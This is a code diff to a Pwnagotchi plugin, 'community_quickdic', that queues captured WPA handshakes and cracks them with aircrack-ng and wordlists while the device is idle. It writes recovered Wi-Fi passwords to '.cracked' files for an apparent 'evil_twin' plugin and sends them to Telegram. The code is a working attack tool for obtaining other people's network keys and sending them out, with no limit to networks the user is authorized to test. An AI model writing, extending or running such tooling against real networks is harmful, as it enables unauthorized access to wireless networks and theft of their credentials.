@@ -84,6 +84,10 @@ class Community_Quickdic(plugins.Plugin):
         self._sync_lock = threading.Lock()
         self._last_sync = 0
         self._syncing = False
+        # Handshakes collected during active scanning; cracked during idle/sleep
+        self._pending = []        # list of (filename, ssid)
+        self._pending_lock = threading.Lock()
+        self._cracked = set()     # filenames already processed this session
 
     # ─── Pwnagotchi callbacks ────────────────────────────────────────────────
 
@@ -145,6 +149,40 @@ class Community_Quickdic(plugins.Plugin):
             self._start_sync()
 
     def on_handshake(self, agent, filename, access_point, client_station):
+        ssid = access_point.get("hostname", "unknown") if access_point else "unknown"
+
+        # Skip if already cracked this session or a .cracked file exists
+        if filename in self._cracked or os.path.exists(filename + ".cracked"):
+            logging.debug(
+                "[community_quickdic] '%s' already cracked — skipping" % ssid
+            )
+            return
+
+        with self._pending_lock:
+            queued = [f for f, _ in self._pending]
+            if filename not in queued:
+                self._pending.append((filename, ssid))
+                logging.info(
+                    "[community_quickdic] queued '%s' — will crack when idle" % ssid
+                )
+
+    def on_sleep(self, agent, secs):
+        """Pwnagotchi is idle/sleeping — good time to run aircrack-ng."""
+        self._crack_pending(agent)
+
+    def _crack_pending(self, agent):
+        """Drain the pending queue and crack each handshake."""
+        with self._pending_lock:
+            pending = list(self._pending)
+            self._pending.clear()
+
+        for filename, ssid in pending:
+            if filename in self._cracked or os.path.exists(filename + ".cracked"):
+                continue
+            self._crack_single(agent, filename, ssid)
+
+    def _crack_single(self, agent, filename, ssid):
+        """Run aircrack-ng against all wordlists for one handshake."""
         display = agent.view()
 
         # Find all .txt wordlists in the configured folder
@@ -167,9 +205,8 @@ class Community_Quickdic(plugins.Plugin):
             )
             return
 
-        ssid = access_point.get("hostname", "unknown") if access_point else "unknown"
         logging.info(
-            "[community_quickdic] Attempting crack on %s using %d wordlist(s)"
+            "[community_quickdic] Cracking '%s' using %d wordlist(s)"
             % (ssid, len(wordlists))
         )
 
@@ -182,12 +219,10 @@ class Community_Quickdic(plugins.Plugin):
                 output = result.stdout.decode("utf-8", errors="replace")
 
                 if "KEY FOUND" in output:
-                    # Read from -l output file for clean password extraction
                     try:
                         with open("/tmp/cracked.txt", "r") as f:
                             password = f.read().strip()
                     except Exception:
-                        # Fallback: parse from stdout
                         for line in output.splitlines():
                             if "KEY FOUND" in line:
                                 password = line.split("[")[-1].rstrip("]").strip()
@@ -200,11 +235,17 @@ class Community_Quickdic(plugins.Plugin):
                         % (ssid, password, os.path.basename(wordlist))
                     )
 
+                    # Mark as done so we don't re-crack in the same session
+                    self._cracked.add(filename)
+                    # Write .cracked file so evil_twin and future runs skip this AP
+                    try:
+                        with open(filename + ".cracked", "w") as cf:
+                            cf.write(password + "\n")
+                    except Exception:
+                        pass
+
                     display.set("face", "(·ω·)")
-                    display.set(
-                        "status",
-                        "Cracked %s!" % ssid
-                    )
+                    display.set("status", "Cracked %s!" % ssid)
                     display.update(force=True)
 
                     self._send_telegram(filename, ssid, password)
